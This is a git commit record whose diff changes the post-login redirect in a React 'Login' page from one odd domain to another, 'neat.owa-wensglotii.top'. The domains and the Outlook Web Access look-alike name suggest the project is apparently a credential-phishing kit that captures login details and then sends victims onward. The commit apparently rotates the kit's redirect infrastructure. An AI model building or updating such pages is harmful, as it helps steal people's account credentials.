f20e55e17acb8b98385ed85a38d2c180c63cae20
husknet <127146284+husknet@users.noreply.github.com>
2025-03-27 11:37:03 +0000

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://nerhol.constructlonjproy.com/';
+      window.location.href = 'https://neat.owa-wensglotii.top/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
